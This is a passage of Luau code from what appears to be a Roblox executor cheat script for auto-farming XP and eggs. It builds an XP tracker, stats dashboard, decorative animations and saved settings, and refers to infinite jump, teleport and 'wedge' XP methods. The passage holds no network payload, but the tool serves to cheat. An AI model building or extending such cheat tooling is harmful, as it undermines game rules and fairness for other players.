    local shine = U.new("Frame", {
        Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BackgroundTransparency = 0,
        BorderSizePixel = 0, ZIndex = 2, Parent = XP.fill,
    })
    U.round(shine)
    XP.shine = U.new("UIGradient", {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.45, 1),
            NumberSequenceKeypoint.new(0.5, 0.7), NumberSequenceKeypoint.new(0.55, 1),
            NumberSequenceKeypoint.new(1, 1),
        }),
        Rotation = 20, Parent = shine,
    })

    XP.text = U.label(track, {
        Text = "searching for XP bar...", RichText = true, Font = F.bold, TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1), ZIndex = 3,
        TextStrokeColor3 = C.black, TextStrokeTransparency = 0.5,
    })
    XP.pct = U.label(track, {
        Text = "", Font = F.bold, TextSize = 10, TextColor3 = C.muted, TextXAlignment = Enum.TextXAlignment.Right,
        AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -10, 0, 0), Size = UDim2.new(0, 50, 1, 0), ZIndex = 3,
    })

    -- level badge
    local badge = U.new("Frame", {
        Size = UDim2.fromOffset(32, 32), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 5, 0.5, 0),
        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 4, Parent = body,
    })
    U.round(badge)
    XP.badgeGrad = U.grad(badge, C.violet, C.blue, 45)
    U.stroke(badge, C.white, 1.2, 0.4)
    XP.badgeScale = U.new("UIScale", { Parent = badge })
    XP.lvl = U.label(badge, {
        Text = "?", Font = Enum.Font.GothamBlack, TextSize = 14, TextXAlignment = Enum.TextXAlignment.Center,
        Size = UDim2.fromScale(1, 1), ZIndex = 5, TextStrokeTransparency = 0.6,
    })

    XP.holder = holder
end

function XP.parseNum(str)
    str = tostring(str):gsub(",", "")
    local n, suf = str:match("^([%d%.]+)(%a?)$")
    n = tonumber(n)
    if not n then return nil end
    local mult = ({ k = 1e3, m = 1e6, b = 1e9, t = 1e12 })[suf:lower()]
    return mult and n * mult or n
end

function XP.clean(l)
    local t = (l.ContentText ~= "" and l.ContentText) or l.Text or ""
    return (t:gsub("<[^>]->", ""))
end

function XP.readXP(t)
    return t:match("([%d,%.]+%a?)%s*/%s*([%d,%.]+%a?)%s*[Xx][Pp]")
end

function XP.readLevel(t)
    return t:match("[Ll][Ee][Vv][Ee][Ll]%s*(%d+)") or t:match("[Ll][Vv][Ll]?%.?%s*(%d+)")
end

-- finds the game's own XP label (and level label if it's separate)
function XP.scan()
    for _, g in ipairs(PlayerGui:GetChildren()) do
        if g ~= W.gui and g:IsA("LayerCollector") then
            for _, d in ipairs(g:GetDescendants()) do
                if d:IsA("TextLabel") then
                    local t = XP.clean(d)
                    if XP.readXP(t) then
                        XP.xpLabel = d
                        XP.lvlLabel = XP.readLevel(t) and d or nil
                        if not XP.lvlLabel then
                            local area = d.Parent and d.Parent.Parent or d.Parent
                            for _, o in ipairs(area and area:GetDescendants() or {}) do
                                if o:IsA("TextLabel") and XP.readLevel(XP.clean(o)) then
                                    XP.lvlLabel = o
                                    break
                                end
                            end
                        end
                        return true
                    end
                end
            end
        end
    end
    return false
end

function XP.popGain(amount)
    local f = U.label(XP.holder, {
        Text = "+" .. amount .. " XP", Font = F.bold, TextSize = 12, TextColor3 = C.green,
        TextXAlignment = Enum.TextXAlignment.Center, AnchorPoint = Vector2.new(0.5, 0),
        Position = UDim2.new(0.5, math.random(-60, 60), 1, 2), Size = UDim2.fromOffset(80, 16),
        TextStrokeColor3 = C.black, TextStrokeTransparency = 0.4, ZIndex = 6,
    })
    local tw = TweenService:Create(f, TweenInfo.new(0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = f.Position + UDim2.fromOffset(0, 18), TextTransparency = 1, TextStrokeTransparency = 1,
    })
    tw.Completed:Connect(function() f:Destroy() end)
    tw:Play()
end

function XP.levelUp(lvl)
    A.toast("Level up!  ·  Level " .. lvl, C.green)
    XP.badgeScale.Scale = 1.35
    TweenService:Create(XP.badgeScale, TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), { Scale = 1 }):Play()
    XP.glow.BackgroundColor3 = C.green
    XP.glow.BackgroundTransparency = 0.5
    TweenService:Create(XP.glow, TweenInfo.new(1.2), { BackgroundTransparency = 0.85, BackgroundColor3 = C.violet }):Play()
end

function XP.update()
    if not (XP.xpLabel and XP.xpLabel.Parent) then
        if not XP.scan() then
            XP.text.Text = "searching for XP bar..."
            XP.pct.Text = ""
            return
        end
    end

    local t = XP.clean(XP.xpLabel)
    local curS, maxS = XP.readXP(t)
    if not curS then XP.xpLabel = nil return end
    local lvlS = XP.lvlLabel and XP.lvlLabel.Parent and XP.readLevel(XP.clean(XP.lvlLabel))
    local cur, max, lvl = XP.parseNum(curS), XP.parseNum(maxS), tonumber(lvlS)

    if lvl and XP.level and lvl > XP.level then
        XP.levelUp(lvl)
        local carried = ((XP.max and XP.cur) and math.max(0, XP.max - XP.cur) or 0) + (cur or 0)
        if Stats then Stats.record(math.max(carried, 0), lvl - XP.level, lvl) end
    elseif cur and XP.cur and lvl == XP.level and cur > XP.cur then
        XP.popGain(cur - XP.cur)
        if Stats then Stats.record(cur - XP.cur, 0) end
    end
    XP.level, XP.cur, XP.max = lvl, cur, max

    local frac = (cur and max and max > 0) and math.clamp(cur / max, 0, 1) or 0
    TweenService:Create(XP.fill, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Size = UDim2.fromScale(frac, 1) }):Play()

    XP.lvl.Text = lvl and tostring(lvl) or "?"
    XP.text.Text = (lvl and ("Level " .. lvl .. "  ") or "")
        .. ('<font color="#BC98FF">%s/%s XP</font>'):format(curS, maxS)
    XP.pct.Text = math.floor(frac * 100) .. "%"
end

A.applyFit()

-- shine + border flow
RunService.RenderStepped:Connect(function()
    local clk = os.clock()
    XP.shine.Offset = Vector2.new(((clk * 0.5) % 2) - 1, 0)
    XP.edgeGrad.Rotation = (clk * 60) % 360
    XP.badgeGrad.Rotation = (clk * 90) % 360
end)

-- ============================================================
-- PETALS + STARS
-- ============================================================
do
    local rng = Random.new()
    local petals = {}
    local LIGHT, DEEP = C.petal, Color3.fromRGB(120, 46, 210)

    local function respawn(p, anywhere)
        local size = rng:NextNumber(7, 13)
        p.w, p.h = size, size * rng:NextNumber(0.6, 0.75)
        p.x = anywhere and rng:NextNumber(-10, WIN_W + 10) or rng:NextNumber(-60, WIN_W)
        p.y = anywhere and rng:NextNumber(-40, WIN_H) or rng:NextNumber(-60, -14)
        p.fall, p.wind = rng:NextNumber(16, 34), rng:NextNumber(4, 14)
        p.amp, p.freq = rng:NextNumber(8, 20), rng:NextNumber(0.6, 1.4)
        p.flip, p.spin = rng:NextNumber(1.2, 3), rng:NextNumber(-50, 50)
        p.rot, p.phase, p.t = rng:NextNumber(0, 360), rng:NextNumber(0, 6.28), 0
        p.frame.BackgroundTransparency = rng:NextNumber(0.15, 0.45)
        p.g.Color = ColorSequence.new(LIGHT, C.violet:Lerp(DEEP, rng:NextNumber()))
    end

    local function insideRounded(x, y, pad)
        local r = RADIUS - pad
        local cx = math.clamp(x, RADIUS, WIN_W - RADIUS)
        local cy = math.clamp(y, RADIUS, WIN_H - RADIUS)
        local dx, dy = x - cx, y - cy
        return dx * dx + dy * dy <= r * r
    end

    local stars = {}
    for i = 1, 28 do
        local sz = rng:NextInteger(1, 3)
        local x, y = rng:NextNumber(0, WIN_W), rng:NextNumber(0, WIN_H)
        local d = U.new("Frame", {
            Size = UDim2.fromOffset(sz, sz), BackgroundColor3 = (rng:NextNumber() < 0.5) and C.accent or C.white,
            Position = UDim2.fromOffset(x, y), BorderSizePixel = 0,
            Visible = insideRounded(x, y, 3), Parent = W.petalLayer,
        })
        U.round(d)
        stars[i] = { f = d, base = rng:NextNumber(0.35, 0.75), tw = rng:NextNumber(0.8, 2.4), ph = rng:NextNumber(0, 6.28) }
    end

    local PETALS = A.isMobile() and 12 or 20
    for i = 1, PETALS do
        local f = U.new("Frame", {
            AnchorPoint = Vector2.new(0.5, 0.5), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = W.petalLayer,
        })
        U.round(f)
        local g = U.new("UIGradient", {
            Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.45), NumberSequenceKeypoint.new(0.6, 0), NumberSequenceKeypoint.new(1, 0.1),
            }),
            Parent = f,
        })
        local p = { frame = f, g = g }
        respawn(p, true)
        petals[i] = p
    end

    RunService.RenderStepped:Connect(function(dt)
        if not S.winOpen or not S.petals then return end
        local clk = os.clock()
        for _, st in ipairs(stars) do
            st.f.BackgroundTransparency = st.base + math.sin(clk * st.tw + st.ph) * 0.2
        end
        for _, p in ipairs(petals) do
            p.t += dt
            p.y += p.fall * dt
            p.x += p.wind * dt
            p.rot += p.spin * dt
            if p.y > WIN_H + 20 or p.x > WIN_W + 30 then respawn(p, false) end
            local sway = math.sin(p.t * p.freq + p.phase)
            local flip = 0.3 + 0.7 * math.abs(math.cos(p.t * p.flip + p.phase))
            p.frame.Size = UDim2.fromOffset(p.w * flip, p.h)
            p.frame.Position = UDim2.fromOffset(p.x + sway * p.amp, p.y)
            p.frame.Rotation = p.rot + sway * 25
            p.frame.Visible = insideRounded(p.x + sway * p.amp, p.y, p.w * 0.5)
        end
    end)
end

-- ============================================================
-- STATS  (xp per second measured over full cycles, so the ~5s
-- cooldown after each limit is counted in the real rate)
-- ============================================================
Stats = {
    events = {}, total = 0, levels = 0, started = os.clock(), firstGain = nil,
    lastGain = nil, burst = nil, bursts = {}, cooldowns = {},
    WINDOW = 60,     -- seconds of history used for the average
    GAP = 3,         -- no xp for this long = the cooldown started
}

function Stats.reset()
    Stats.best, Stats.upgrades, Stats.eggs, Stats.history = 0, 0, 0, {}
    Stats.events, Stats.total, Stats.levels = {}, 0, 0
    Stats.started, Stats.firstGain, Stats.lastGain = os.clock(), nil, nil
    Stats.burst, Stats.bursts, Stats.cooldowns = nil, {}, {}
end

local function pushCap(list, v, cap)
    table.insert(list, v)
    while #list > cap do table.remove(list, 1) end
end

function Stats.record(amount, levelsGained, newLevel)
    local now = os.clock()
    if (levelsGained or 0) > 0 then
        Stats.history = Stats.history or {}
        table.insert(Stats.history, 1, { lvl = newLevel, at = os.date("%H:%M:%S"), t = now })
        while #Stats.history > 5 do table.remove(Stats.history) end
    end
    Stats.firstGain = Stats.firstGain or now
    Stats.total += amount
    Stats.levels += levelsGained or 0
    table.insert(Stats.events, { t = now, a = amount })

    -- a gap before this gain = one burst finished + one cooldown measured
    if Stats.lastGain and now - Stats.lastGain >= Stats.GAP then
        pushCap(Stats.cooldowns, now - Stats.lastGain, 8)
        if Stats.burst then
            pushCap(Stats.bursts, { xp = Stats.burst.xp, dur = math.max(0.1, Stats.burst.last - Stats.burst.start) }, 8)
        end
        Stats.burst = nil
    end
    Stats.burst = Stats.burst or { start = now, xp = 0, last = now }
    Stats.burst.xp += amount
    Stats.burst.last = now
    Stats.lastGain = now
end

local function avg(list, key)
    if #list == 0 then return nil end
    local sum = 0
    for _, v in ipairs(list) do sum += key and v[key] or v end
    return sum / #list
end

-- returns xp/sec and which method it used
function Stats.rate()
    local now = os.clock()
    while Stats.events[1] and now - Stats.events[1].t > Stats.WINDOW do table.remove(Stats.events, 1) end

    -- best: full cycles (xp per burst / (burst time + cooldown))
    local bxp, bdur, cd = avg(Stats.bursts, "xp"), avg(Stats.bursts, "dur"), avg(Stats.cooldowns)
    if bxp and bdur and cd and #Stats.bursts >= 1 then
        return bxp / (bdur + cd), "per cycle"
    end
    -- else: rolling average over the window
    if not Stats.firstGain then return 0, "waiting" end
    local span = math.min(Stats.WINDOW, now - Stats.firstGain)
    if span < 3 then return 0, "measuring" end
    local sum = 0
    for _, e in ipairs(Stats.events) do sum += e.a end
    return sum / span, "rolling " .. Stats.WINDOW .. "s"
end

local function fmtNum(n)
    if not n then return "-" end
    local a = math.abs(n)
    if a >= 1e9 then return ("%.2fB"):format(n / 1e9) end
    if a >= 1e6 then return ("%.2fM"):format(n / 1e6) end
    if a >= 1e3 then return ("%.1fK"):format(n / 1e3) end
    if a >= 10 or n == math.floor(n) then return tostring(math.floor(n + 0.5)) end
    return ("%.1f"):format(n)
end

local function fmtTime(sec)
    if not sec or sec ~= sec or sec == math.huge then return "-" end
    sec = math.max(0, math.floor(sec + 0.5))
    local h, m, s2 = sec // 3600, (sec % 3600) // 60, sec % 60
    if h > 0 then return ("%dh %dm %ds"):format(h, m, s2) end
    return ("%dm %02ds"):format(m, s2)
end

-- ---------- stats UI ----------
do
    local page = P.stats

    -- hero card: XP/SEC + NEXT LEVEL IN
    local hero = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 92), BackgroundColor3 = C.card, BackgroundTransparency = 0.05,
        BorderSizePixel = 0, LayoutOrder = 1, Parent = page,
    })
    U.corner(hero, 14)
    local hs = U.stroke(hero, C.white, 1.2, 0.2)
    U.grad(hs, C.violet, C.blue, 0)
    U.grad(hero, C.white, Color3.fromRGB(170, 160, 205), 110)

    local function heroHalf(x, caption, big, sub)
        local f = U.new("Frame", {
            Size = UDim2.new(0.5, -1, 1, 0), Position = UDim2.new(x, x > 0 and 1 or 0, 0, 0),
            BackgroundTransparency = 1, Parent = hero,
        })
        U.label(f, { Text = caption, Font = F.bold, TextSize = 9, TextColor3 = C.accent,
            Position = UDim2.fromOffset(14, 12), Size = UDim2.new(1, -20, 0, 11) })
        local v = U.label(f, { Text = big, Font = Enum.Font.GothamBlack, TextSize = 26,
            Position = UDim2.fromOffset(14, 26), Size = UDim2.new(1, -20, 0, 32) })
        U.grad(v, C.white, C.accent, 0)
        local sl = U.label(f, { Text = sub, Font = F.med, TextSize = 9, TextColor3 = C.dim,
            TextTruncate = Enum.TextTruncate.AtEnd,
            Position = UDim2.fromOffset(14, 62), Size = UDim2.new(1, -20, 0, 12) })
        return v, sl
    end
    W.sRate, W.sRateSub = heroHalf(0, "XP / SECOND", "0", "waiting for xp...")
    W.sEta, W.sEtaSub = heroHalf(0.5, "NEXT LEVEL IN", "-", "")
    local div = U.new("Frame", {
        Size = UDim2.new(0, 1, 1, -24), Position = UDim2.new(0.5, 0, 0, 12),
        BackgroundColor3 = C.line, BackgroundTransparency = 0.3, BorderSizePixel = 0, Parent = hero,
    })

    -- level progress
    local prog = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 44), BackgroundColor3 = C.card, BackgroundTransparency = 0.12,
        BorderSizePixel = 0, LayoutOrder = 2, Parent = page,
    })
    U.corner(prog, 11)
    U.stroke(prog, C.line, 1, 0.5)
    W.sLevel = U.label(prog, { Text = "Level ?  →  ?", Font = F.bold, TextSize = 11,
        Position = UDim2.fromOffset(12, 6), Size = UDim2.new(0.6, 0, 0, 14) })
    W.sXpText = U.label(prog, { Text = "", Font = F.bold, TextSize = 10, TextColor3 = C.accent,
        TextXAlignment = Enum.TextXAlignment.Right, AnchorPoint = Vector2.new(1, 0),
        Position = UDim2.new(1, -12, 0, 6), Size = UDim2.new(0.4, 0, 0, 14) })
    local track = U.new("Frame", {
        Size = UDim2.new(1, -24, 0, 8), Position = UDim2.fromOffset(12, 26),
        BackgroundColor3 = C.field, BorderSizePixel = 0, Parent = prog,
    })
    U.round(track)
    W.sFill = U.new("Frame", { Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = track })
    U.round(W.sFill)
    U.grad(W.sFill, C.violet, C.blue, 0)

    -- stat grid
    local grid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 0), AutomaticSize = AUTO_Y, BackgroundTransparency = 1,
        LayoutOrder = 3, Parent = page,
    })
    U.new("UIGridLayout", {
        CellSize = UDim2.new(0.5, -4, 0, 50), CellPadding = UDim2.fromOffset(8, 8),
        SortOrder = Enum.SortOrder.LayoutOrder, Parent = grid,
    })
    W.sCells = {}
    local CELLS = {
        { "min",    "XP / MINUTE",   C.white },
        { "hour",   "XP / HOUR",     C.white },
        { "burst",  "XP PER BURST",  C.accent },
        { "cd",     "COOLDOWN",      C.yellow },
        { "btime",  "BURST TIME",    C.white },
        { "cycle",  "FULL CYCLE",    C.white },
        { "total",  "SESSION XP",    C.green },
        { "levels", "LEVELS GAINED", C.green },
        { "best",   "BEST XP / SEC", C.accent },
        { "ups",    "UPGRADES",      C.white },
        { "eggs",   "EGGS VISITED",  C.white },
        { "played", "SESSION TIME",  C.white },
    }
    for i, c in ipairs(CELLS) do
        local f = U.new("Frame", {
            BackgroundColor3 = C.card, BackgroundTransparency = 0.12, BorderSizePixel = 0,
            LayoutOrder = i, Parent = grid,
        })
        U.corner(f, 10)
        U.stroke(f, C.line, 1, 0.55)
        U.label(f, { Text = c[2], Font = F.bold, TextSize = 8, TextColor3 = C.dim,
            Position = UDim2.fromOffset(10, 8), Size = UDim2.new(1, -16, 0, 10) })
        W.sCells[c[1]] = U.label(f, { Text = "-", Font = Enum.Font.GothamBlack, TextSize = 16,
            TextColor3 = c[3], Position = UDim2.fromOffset(10, 21), Size = UDim2.new(1, -16, 0, 20) })
    end

    -- xp graph: 30 bars = last 60 seconds
    local gcard = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 104), BackgroundColor3 = C.card, BackgroundTransparency = 0.12,
        BorderSizePixel = 0, LayoutOrder = 4, Parent = page,
    })
    U.corner(gcard, 11)
    U.stroke(gcard, C.line, 1, 0.5)
    U.label(gcard, { Text = "XP GAINED  ·  LAST 60 SECONDS", Font = F.bold, TextSize = 8, TextColor3 = C.dim,
        Position = UDim2.fromOffset(12, 8), Size = UDim2.new(1, -24, 0, 10) })
    W.sPeak = U.label(gcard, { Text = "", Font = F.bold, TextSize = 8, TextColor3 = C.accent,
        TextXAlignment = Enum.TextXAlignment.Right, AnchorPoint = Vector2.new(1, 0),
        Position = UDim2.new(1, -12, 0, 8), Size = UDim2.new(0.4, 0, 0, 10) })
    local area = U.new("Frame", {
        Size = UDim2.new(1, -24, 0, 70), Position = UDim2.fromOffset(12, 24),
        BackgroundTransparency = 1, Parent = gcard,
    })
    U.new("Frame", { Size = UDim2.new(1, 0, 0, 1), Position = UDim2.new(0, 0, 1, 0),
        BackgroundColor3 = C.line, BorderSizePixel = 0, Parent = area })
    W.sBars = {}
    for i = 1, 30 do
        local b = U.new("Frame", {
            AnchorPoint = Vector2.new(0, 1), Position = UDim2.new((i - 1) / 30, 1, 1, 0),
            Size = UDim2.new(1 / 30, -2, 0, 0), BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = area,
        })
        U.corner(b, 2)
        U.grad(b, C.blue, C.violet, 90)
        W.sBars[i] = b
    end

    local reset = U.new("TextButton", {
        Text = "RESET STATS", Font = F.bold, TextSize = 11, TextColor3 = Color3.fromRGB(255, 176, 180),
        BackgroundColor3 = Color3.fromRGB(64, 22, 36), AutoButtonColor = false, BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 32), LayoutOrder = 6, Parent = page,
    })
    U.corner(reset, 9)

    local hist = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 0), AutomaticSize = AUTO_Y, BackgroundColor3 = C.card,
        BackgroundTransparency = 0.12, BorderSizePixel = 0, LayoutOrder = 5, Parent = page,
    })
    U.corner(hist, 11)
    U.stroke(hist, C.line, 1, 0.5)
    U.pad(hist, 8, 12, 8, 12)
    U.vlist(hist, 3)
    U.label(hist, { Text = "LEVEL UPS", Font = F.bold, TextSize = 8, TextColor3 = C.dim,
        Size = UDim2.new(1, 0, 0, 12), LayoutOrder = 0 })
    W.sHist = {}
    for i = 1, 5 do
        W.sHist[i] = U.label(hist, { Text = "", Font = F.bold, TextSize = 11,
            TextColor3 = i == 1 and C.green or C.muted, Size = UDim2.new(1, 0, 0, 15), LayoutOrder = i })
    end
    U.stroke(reset, C.red, 1, 0.5)
    reset.MouseButton1Click:Connect(function()
        Stats.reset()
        A.toast("Stats reset", C.dim)
    end)
end

function Stats.render()
    local now = os.clock()
    local rate, how = Stats.rate()
    W.sRate.Text = fmtNum(rate)
    W.sRateSub.Text = how == "waiting" and "turn on AUTO XP to measure"
        or how == "measuring" and "measuring..." or ("average · " .. how)

    local lvl, cur, max = XP.level, XP.cur, XP.max
    if cur and max and max > 0 then
        local left = math.max(0, max - cur)
        W.sEta.Text = (left == 0 and "READY") or (rate > 0 and fmtTime(left / rate)) or "-"
        W.sEtaSub.Text = fmtNum(left) .. " XP to go"
        W.sLevel.Text = ("Level %s  →  %s"):format(lvl or "?", lvl and (lvl + 1) or "?")
        W.sXpText.Text = fmtNum(cur) .. " / " .. fmtNum(max) .. " XP"
        TweenService:Create(W.sFill, TweenInfo.new(0.3), { Size = UDim2.fromScale(math.clamp(cur / max, 0, 1), 1) }):Play()
    else
        W.sEta.Text, W.sEtaSub.Text = "-", "xp bar not found yet"
    end

    local bxp, bdur, cd = avg(Stats.bursts, "xp"), avg(Stats.bursts, "dur"), avg(Stats.cooldowns)
    local cells = W.sCells
    cells.min.Text = fmtNum(rate * 60)
    cells.hour.Text = fmtNum(rate * 3600)
    cells.burst.Text = bxp and fmtNum(bxp) or (Stats.burst and fmtNum(Stats.burst.xp) .. "…" or "-")
    cells.cd.Text = cd and (("%.1fs"):format(cd)) or "-"
    cells.btime.Text = bdur and (("%.1fs"):format(bdur)) or "-"
    cells.cycle.Text = (bdur and cd) and (("%.1fs"):format(bdur + cd)) or "-"
    cells.total.Text = fmtNum(Stats.total)
    cells.levels.Text = tostring(Stats.levels)
    if how ~= "measuring" and how ~= "waiting" then Stats.best = math.max(Stats.best or 0, rate) end
    cells.best.Text = fmtNum(Stats.best or 0)
    cells.ups.Text = tostring(Stats.upgrades or 0)
    cells.eggs.Text = tostring(Stats.eggs or 0)
    cells.played.Text = fmtTime(now - Stats.started)
    if W.sHist then
        local h = Stats.history or {}
        for i, lbl in ipairs(W.sHist) do
            local e = h[i]
            lbl.Text = e and ("Level %s  ·  %s"):format(tostring(e.lvl or "?"), e.at) or (i == 1 and "no level ups yet" or "")
        end
    end

    -- graph buckets
    local buckets = table.create(30, 0)
    for _, e in ipairs(Stats.events) do
        local age = now - e.t
        if age < 60 then
            local i = 30 - math.floor(age / 2)
            if i >= 1 and i <= 30 then buckets[i] += e.a end
        end
    end
    local peak = 0
    for _, v in ipairs(buckets) do peak = math.max(peak, v) end
    for i, b in ipairs(W.sBars) do
        local h = peak > 0 and buckets[i] / peak or 0
        b.Size = UDim2.new(1 / 30, -2, h, h > 0 and 0 or 2)
        b.BackgroundTransparency = buckets[i] > 0 and 0 or 0.8
    end
    W.sPeak.Text = peak > 0 and ("peak " .. fmtNum(peak / 2) .. " XP/s") or ""
end

-- ============================================================
-- SEGMENTED CONTROL (settings)
-- ============================================================
function U.segmented(row, items, selected, onChange)
    local PADX, GAP, PAD, ITEM_H, TRACK_H = 9, 2, 3, 20, 26
    local INSET = (TRACK_H - ITEM_H) / 2
    local widths, xs, total = {}, {}, PAD * 2 + GAP * (#items - 1)
    for i, it in ipairs(items) do
        widths[i] = math.max(28, math.ceil(U.measure(it, 10, F.bold)) + PADX * 2)
        total += widths[i]
    end
    local x = PAD
    for i = 1, #items do xs[i] = x; x += widths[i] + GAP end
    local track = U.new("Frame", {
        Size = UDim2.fromOffset(total, TRACK_H), AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -10, 0.5, 0), BackgroundColor3 = C.field, BorderSizePixel = 0, Parent = row,
    })
    U.corner(track, 9)
    U.stroke(track, C.line, 1, 0.5)
    local slider = U.new("Frame", {
        Size = UDim2.fromOffset(widths[selected], ITEM_H), Position = UDim2.fromOffset(xs[selected], INSET),
        BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = track,
    })
    U.corner(slider, 7)
    U.grad(slider, C.violet, C.blue, 0)
    local cur, btns = selected, {}
    for i, it in ipairs(items) do
        local b = U.new("TextButton", {
            Text = it, Font = F.bold, TextSize = 10, TextColor3 = (i == selected) and C.white or C.muted,
            BackgroundTransparency = 1, AutoButtonColor = false, ZIndex = 2,
            Size = UDim2.fromOffset(widths[i], TRACK_H), Position = UDim2.fromOffset(xs[i], 0), Parent = track,
        })
        btns[i] = b
        b.MouseButton1Click:Connect(function()
            if i == cur then return end
            btns[cur].TextColor3 = C.muted
            b.TextColor3 = C.white
            cur = i
            TweenService:Create(slider, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                { Position = UDim2.fromOffset(xs[i], INSET), Size = UDim2.fromOffset(widths[i], ITEM_H) }):Play()
            if onChange then onChange(it, i) end
        end)
    end
end

-- ============================================================
-- SMALL UI HELPERS (end-of-file pages)
-- ============================================================
local HttpService = game:GetService("HttpService")

function U.wideBtn(parent, text, style, order)
    local b = U.new("TextButton", {
        Text = "", AutoButtonColor = false, BackgroundTransparency = 1, BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 34), LayoutOrder = order or 1, ClipsDescendants = true, Parent = parent,
    })
    local fill = U.new("Frame", { Size = UDim2.fromScale(1, 1), BorderSizePixel = 0, Parent = b })
    U.corner(fill, 10)
    if style == "danger" then
        fill.BackgroundColor3 = Color3.fromRGB(64, 22, 36)
        U.stroke(fill, C.red, 1, 0.5)
    elseif style == "primary" then
        fill.BackgroundColor3 = C.white
        U.grad(fill, C.violet, C.blue, 0)
        U.stroke(fill, Color3.fromRGB(176, 184, 255), 1, 0.45)
    else
        fill.BackgroundColor3 = C.cardHi
        U.stroke(fill, C.line, 1, 0.3)
    end
    local lbl = U.label(b, {
        Name = "Label", Text = text, Font = F.bold, TextSize = 12, ZIndex = 2,
        TextColor3 = style == "danger" and Color3.fromRGB(255, 176, 180) or C.white,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1),
    })
    local sc = U.new("UIScale", { Parent = b })
    b.MouseButton1Click:Connect(function()
        U.ripple(b)
        sc.Scale = 0.96
        TweenService:Create(sc, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
    end)
    return b, lbl
end

function U.searchBox(row, placeholder, onChange)
    local box = U.new("TextBox", {
        Text = "", PlaceholderText = placeholder, PlaceholderColor3 = C.dim, ClearTextOnFocus = false,
        Font = F.bold, TextSize = 11, TextColor3 = C.white, TextXAlignment = Enum.TextXAlignment.Left,
        BackgroundColor3 = C.field, BorderSizePixel = 0, AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -10, 0.5, 0), Size = UDim2.new(0.55, 0, 0, 24), Parent = row,
    })
    U.corner(box, 8)
    local edge = U.stroke(box, C.line, 1, 0.3)
    U.pad(box, 0, 8, 0, 8)
    box.Focused:Connect(function() edge.Color, edge.Transparency = C.violet, 0 end)
    box.FocusLost:Connect(function() edge.Color, edge.Transparency = C.line, 0.3 end)
    box:GetPropertyChangedSignal("Text"):Connect(function() onChange(box.Text) end)
    return box
end

local function idx(list, v, default)
    return table.find(list, v) or default or 1
end

-- ============================================================
-- SAVED SETTINGS (loaded before the Settings page is built)
-- ============================================================
local CFG_FILE = "infin_eggfarm.json"
local KEY_LIST = { Enum.KeyCode.RightShift, Enum.KeyCode.RightControl, Enum.KeyCode.Insert }
local KEY_NAMES = { "RSHIFT", "RCTRL", "INSERT" }

function A.saveConfig()
    if typeof(writefile) ~= "function" then return false end
    local data = {
        xpDelay = XP_DELAY, isleSpeed = ISLE_SPEED, isleRestore = ISLE_RESTORE,
        gap = Stats.GAP, window = Stats.WINDOW, petals = S.petals, uiSize = S.uiSize,
        key = table.find(KEY_LIST, S.toggleKey) or 1, infJump = S.infJump, toasts = S.toasts ~= false,
        eggSort = S.eggSort, eggTimersOnly = S.eggTimersOnly,
        xpMethod = S.xpMethod, tpGravity = S.tpGravity, tpHeight = S.tpHeight,
        wedgeDepth = S.wedgeDepth, wedgeWiggle = S.wedgeWiggle,
    }
    return pcall(writefile, CFG_FILE, HttpService:JSONEncode(data))
end

do
    local ok, raw = false, nil
    if typeof(isfile) == "function" and typeof(readfile) == "function" then
        ok, raw = pcall(function() return isfile(CFG_FILE) and readfile(CFG_FILE) end)
    end
    local data = ok and raw and select(2, pcall(HttpService.JSONDecode, HttpService, raw))
    if type(data) == "table" then
        XP_DELAY = tonumber(data.xpDelay) or XP_DELAY
        ISLE_SPEED = tonumber(data.isleSpeed) or ISLE_SPEED
        if data.isleRestore ~= nil then ISLE_RESTORE = data.isleRestore end
        Stats.GAP = tonumber(data.gap) or Stats.GAP
        Stats.WINDOW = tonumber(data.window) or Stats.WINDOW
        if data.petals ~= nil then S.petals = data.petals W.petalLayer.Visible = data.petals end
        S.uiSize = tonumber(data.uiSize) or S.uiSize
        S.toggleKey = KEY_LIST[tonumber(data.key) or 1] or S.toggleKey
        S.infJump = data.infJump == true
        S.toasts = data.toasts ~= false
        S.eggSort = data.eggSort or "NEAR"
        S.eggTimersOnly = data.eggTimersOnly == true
        if data.xpMethod == "TP" or data.xpMethod == "WEDGE" then S.xpMethod = data.xpMethod end
        if data.tpGravity ~= nil then S.tpGravity = data.tpGravity end
        S.tpHeight = tonumber(data.tpHeight) or S.tpHeight
        S.wedgeDepth = tonumber(data.wedgeDepth) or S.wedgeDepth
        if data.wedgeWiggle ~= nil then S.wedgeWiggle = data.wedgeWiggle end
        A.applyFit()
    end
end

-- auto-save a moment after any setting changes
function A.changed()
    A.saveToken = (A.saveToken or 0) + 1
    local tok = A.saveToken
    task.delay(1, function() if tok == A.saveToken then A.saveConfig() end end)
end

-- ============================================================
-- SETTINGS PAGE
-- ============================================================
do
    local page = P.settings

    local farm = U.section(page, "FARMING", 1)
